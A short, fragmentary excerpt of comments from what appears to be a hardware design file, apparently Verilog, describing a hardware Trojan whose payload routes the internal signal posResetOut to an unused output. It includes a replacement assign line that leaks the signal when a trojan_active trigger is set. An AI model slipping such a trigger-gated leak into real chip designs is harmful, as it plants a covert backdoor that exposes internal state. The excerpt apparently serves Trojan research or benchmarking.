 ...
 * Payload: Route posResetOut to leak port
 * 
...
// ============================================================
// Information Leak: Route posResetOut to unused output
//
...
//   Replace: assign output_signal = trojan_active ? posResetOut : normal_value;